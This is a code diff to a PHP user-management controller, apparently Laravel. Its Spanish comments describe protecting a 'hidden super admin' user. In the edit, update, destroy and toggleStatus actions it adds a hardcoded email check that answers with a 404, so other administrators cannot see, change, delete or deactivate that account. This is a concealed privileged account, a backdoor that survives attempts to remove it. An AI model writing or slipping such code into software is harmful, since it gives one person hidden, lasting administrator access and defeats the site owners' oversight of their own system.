@@ -61,6 +61,11 @@ class UsersController extends Controller
 
     public function edit(User $user)
     {
+        // Proteger usuario super admin oculto
+        if ($user->email === 'yohan@nexbu.com') {
+            abort(404);
+        }
+
         $roles = $this->getAvailableRoles();
         $user->load('roles');
 
@@ -72,6 +77,11 @@ class UsersController extends Controller
 
     public function update(Request $request, User $user)
     {
+        // Proteger usuario super admin oculto
+        if ($user->email === 'yohan@nexbu.com') {
+            abort(404);
+        }
+
         $request->validate([
             'name' => 'required|string|max:255',
             'email' => 'required|string|email|max:255|unique:users,email,' . $user->id,
@@ -93,6 +103,11 @@ class UsersController extends Controller
 
     public function destroy(User $user)
     {
+        // Proteger usuario super admin oculto
+        if ($user->email === 'yohan@nexbu.com') {
+            abort(404);
+        }
+
         if ($user->id === auth()->id()) {
             return redirect()->route('admin.users.index')
                 ->with('error', 'No puedes eliminar tu propia cuenta.');
@@ -106,6 +121,11 @@ class UsersController extends Controller
 
     public function toggleStatus(User $user)
     {
+        // Proteger usuario super admin oculto
+        if ($user->email === 'yohan@nexbu.com') {
+            abort(404);
+        }
+
         if ($user->id === auth()->id()) {
             return redirect()->route('admin.users.index')
                 ->with('error', 'No puedes desactivar tu propia cuenta.');
